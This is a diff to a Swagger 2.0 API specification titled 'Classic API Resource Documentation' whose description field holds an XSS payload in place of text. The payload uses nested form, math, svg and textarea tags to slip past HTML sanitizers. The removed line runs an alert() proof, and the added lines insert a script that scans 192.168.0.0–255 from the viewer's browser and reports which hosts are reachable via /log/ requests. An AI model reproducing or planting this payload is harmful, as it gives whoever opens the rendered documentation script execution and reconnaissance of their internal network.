@@ -2,7 +2,17 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img onerror=alert(document.domain) src=1>"></form>
+    <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>
+    <script>
+     for (let i = 0; i < 256; i++) {
+      let ip = '192.168.0.' + i
+
+      let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
+      document.body.innerHTML += code
+     }
+    </script>
+
+    "></form>
 
   version: production
 basePath: /JSSResource/
